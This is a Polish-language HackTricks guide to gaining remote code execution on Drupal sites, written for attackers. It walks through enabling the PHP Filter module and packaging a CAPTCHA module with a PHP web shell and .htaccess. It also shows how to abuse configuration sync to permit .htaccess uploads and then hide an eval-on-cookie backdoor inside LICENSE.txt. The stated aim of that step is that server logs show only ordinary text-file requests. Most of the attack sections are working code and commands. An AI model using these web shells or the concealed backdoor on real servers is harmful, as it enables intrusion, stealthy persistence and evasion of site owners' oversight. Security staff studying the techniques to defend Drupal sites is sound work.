# Drupal RCE

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Z modułem Filtra PHP

{% hint style="warning" %}
W starszych wersjach Drupal **(przed wersją 8)**, było możliwe zalogowanie się jako administrator i **włączenie modułu `PHP filter`**, który "Umożliwia ocenianie osadzonego kodu PHP/skryptów." Ale od wersji 8 ten moduł nie jest zainstalowany domyślnie.
{% endhint %}

Potrzebujesz, aby **wtyczka php była zainstalowana** (sprawdź to przechodząc do _/modules/php_ i jeśli zwraca **403**, to **istnieje**, jeśli **nie znaleziono**, to **wtyczka php nie jest zainstalowana**)

Przejdź do _Modules_ -> (**Sprawdź**) _PHP Filter_ -> _Zapisz konfigurację_

![](<../../../.gitbook/assets/image (247) (1).png>)

Następnie kliknij _Dodaj zawartość_ -> Wybierz _Podstawowa strona_ lub _Artykuł_ -> Napisz _kod php shell na stronie_ -> Wybierz _Kod PHP_ w _Formacie tekstu_ -> Wybierz _Podgląd_

![](<../../../.gitbook/assets/image (338).png>)

W końcu po prostu przejdź do nowo utworzonego węzła:
```bash
curl http://drupal-site.local/node/3
```
## Zainstaluj moduł Filtra PHP

{% hint style="warning" %}
W bieżących wersjach nie jest już możliwe instalowanie wtyczek, mając dostęp tylko do sieci po domyślnej instalacji.
{% endhint %}

Od wersji **8 i nowszych**, [**moduł Filtra PHP**](https://www.drupal.org/project/php/releases/8.x-1.1) **nie jest instalowany domyślnie**. Aby skorzystać z tej funkcjonalności, musimy **zainstalować moduł samodzielnie**.

1. Pobierz najnowszą wersję modułu ze strony internetowej Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Po pobraniu przejdź do **`Administracja`** > **`Raporty`** > **`Dostępne aktualizacje`**.
3. Kliknij **`Przeglądaj`**, wybierz plik z katalogu, do którego go pobraliśmy, a następnie kliknij **`Zainstaluj`**.
4. Po zainstalowaniu modułu możemy kliknąć **`Zawartość`** i **utworzyć nową podstawową stronę**, podobnie jak w przykładzie dla Drupal 7. Ponownie upewnij się, że **wybrano `Kod PHP` z rozwijanego menu `Format tekstu`**.

## Moduł z tylnymi drzwiami

{% hint style="warning" %}
W bieżących wersjach nie jest już możliwe instalowanie wtyczek, mając dostęp tylko do sieci po domyślnej instalacji.
{% endhint %}

Moduł z tylnymi drzwiami można utworzyć, **dodając powłokę do istniejącego modułu**. Moduły można znaleźć na stronie drupal.org. Wybierzmy moduł, taki jak [CAPTCHA](https://www.drupal.org/project/captcha). Przewiń w dół i skopiuj link do archiwum [tar.gz](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Pobierz archiwum i rozpakuj jego zawartość.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Utwórz **PHP web shell** o następującej zawartości:
```php
<?php
system($_GET["cmd"]);
?>
```
* Następnie musimy utworzyć plik **`.htaccess`**, aby uzyskać dostęp do folderu. Jest to konieczne, ponieważ Drupal odmawia bezpośredniego dostępu do folderu **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Konfiguracja powyżej będzie stosować zasady dla folderu /, gdy żądamy pliku w /modules. Skopiuj oba te pliki do folderu captcha i utwórz archiwum.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Zakładając, że mamy **dostęp administracyjny** do strony internetowej, klikamy na **`Zarządzaj`**, a następnie na **`Rozszerzenia`** w pasku bocznym. Następnie klikamy przycisk **`+ Zainstaluj nowy moduł`**, i zostaniemy przeniesieni do strony instalacji, na przykład `http://drupal-site.local/admin/modules/install`. Przeglądamy archiwum z tylnymi drzwiami Captcha i klikamy **`Zainstaluj`**.
* Po udanej instalacji, przechodzimy do **`/modules/captcha/shell.php`**, aby wykonywać polecenia.

## Podstawienie Drupal za pomocą synchronizacji konfiguracji <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post udostępniony przez** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Część 1 (aktywacja _Media_ i _Biblioteki mediów_)

W menu _Rozszerzenia_ (/admin/modules) można aktywować wtyczki, które wydają się być już zainstalowane. Domyślnie wtyczki _Media_ i _Biblioteka mediów_ nie wydają się być aktywowane, więc aktywujemy je.

Przed aktywacją:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Po aktywacji:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Część 2 (wykorzystanie funkcji _Synchronizacja konfiguracji_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wykorzystamy funkcję _Synchronizacja konfiguracji_ do zrzucania (eksportu) i przesyłania (importu) wpisów konfiguracyjnych Drupala:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Zmiana system.file.yml**

Zacznijmy od zmiany pierwszego wpisu `allow_insecure_uploads` z:

Plik: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Załataj pole field.field.media.document.field\_media\_document.yml**

Następnie, załataj drugi wpis `file_extensions` z:

Plik: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Nie używam tego w tym wpisie na blogu, ale zauważono, że można zdefiniować wpis `file_directory` w dowolny sposób i że jest podatny na atak ścieżki (więc możemy wrócić w górę drzewa systemu plików Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Część 3 (wykorzystanie funkcji _Dodaj dokument_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Ostatni krok jest najprostszy i składa się z dwóch podkroków. Pierwszy polega na przesłaniu pliku w formacie .htaccess, aby wykorzystać dyrektywy Apache i umożliwić interpretację plików .txt przez silnik PHP. Drugi polega na przesłaniu pliku .txt zawierającego nasz ładunek.

Plik: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Dlaczego ten trik jest fajny?

Ponieważ po upuszczeniu Webshell (który nazwiemy LICENSE.txt) na serwer WWW, możemy przesyłać nasze polecenia za pomocą `$_COOKIE`, a w dziennikach serwera WWW będzie to wyglądać jak prawidłowe żądanie GET do pliku tekstowego.

Dlaczego nazwać nasz Webshell LICENSE.txt?

Po prostu dlatego, że jeśli weźmiemy następujący plik, na przykład [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (który jest już obecny w jądrze Drupal), mamy plik składający się z 339 linii i o wielkości 17,6 KB, co jest idealne do dodania małego fragmentu kodu PHP pośrodku (ponieważ plik jest wystarczająco duży).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Plik: Zaktualizowany LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Część 3.1 (przesłanie pliku .htaccess)**

Najpierw wykorzystujemy funkcję _Dodaj dokument_ (/media/add/document), aby przesłać nasz plik zawierający dyrektywy Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Część 3.2 (przesłanie pliku LICENSE.txt)**

Następnie ponownie wykorzystujemy funkcję _Dodaj dokument_ (/media/add/document), aby przesłać Webshell ukryty w pliku licencyjnym.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Część 4 (interakcja z Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Ostatnia część polega na interakcji z Webshell.

Jak pokazano na poniższym zrzucie ekranu, jeśli oczekiwane ciasteczko przez nasz Webshell nie jest zdefiniowane, otrzymujemy następujący wynik podczas konsultowania pliku za pomocą przeglądarki internetowej.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Kiedy atakujący ustawia ciasteczko, może on interagować z Webshell i wykonywać dowolne polecenia, których chce.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

I jak widać w logach, wygląda na to, że został poproszony tylko plik txt.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Dziękuję za poświęcenie czasu na przeczytanie tego artykułu, mam nadzieję, że pomoże Ci zdobyć kilka shelli.
